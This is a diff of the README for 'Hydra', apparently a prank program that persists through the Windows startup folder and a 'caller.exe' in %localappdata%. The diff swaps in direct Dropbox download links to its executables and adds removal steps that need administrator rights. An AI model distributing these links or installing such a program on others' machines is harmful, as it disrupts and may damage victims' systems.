@@ -2,18 +2,16 @@
 
 ## Direct download
 
-###### Currently working on V3 for compatibilty with Windows 11.
-
-###### Not compatible with Windows 11 (may break the system)
+###### Windows11 Update (backward compatible with Win10 and Win7)
   Download latest version [here](http://hydra-latest.ml) 
 
 ###### Not compatible with Windows 11 (may break the system)
-  Download [HydraV2](http://hydrav2.ml)\
-  Download [HydraV1](http://hydraz.ml)
+  Download [HydraV2](https://www.dropbox.com/s/0b6lpq5zdzn0lfq/hydrav2.exe?dl=1)\
+  Download [HydraV1](https://www.dropbox.com/s/ujpl2ln1e08o3pc/hydra.exe?dl=1)
 
 ## Uninstallation
 
-###### [hydrav2.exe](http://hydrav2.ml)
+###### [hydrav3.exe](https://www.dropbox.com/s/9to311lo5jj4u9v/hydrav3.exe?dl=1)
   1. locate the directory "HYDRA_INFO" on your Desktop
   1. follow the steps in README.txt:
       1. head over to the common startup directory by hitting WIN+R and typing "shell:common startup" 
@@ -21,7 +19,15 @@
          This process requires you to be a System Administrator.
       1. delete "caller.exe" in %localappdata%
 
-###### [hydra.exe](http://hydraz.ml)
+###### [hydrav2.exe](https://www.dropbox.com/s/0b6lpq5zdzn0lfq/hydrav2.exe?dl=1)
+  1. locate the directory "HYDRA_INFO" on your Desktop
+  1. follow the steps in README.txt:
+      1. head over to the common startup directory by hitting WIN+R and typing "shell:common startup" 
+      1. copy or create a file identical to the other file in "HYDRA_INFO" (currently: "pleaseStopItNow") in the common startup folder. 
+         This process requires you to be a System Administrator.
+      1. delete "caller.exe" in %localappdata%
+
+###### [hydra.exe](https://www.dropbox.com/s/ujpl2ln1e08o3pc/hydra.exe?dl=1)
   1. Stop the process:
       * Option A:
           1. head over to the common startup directory by hitting WIN+R and typing "shell:common startup" 
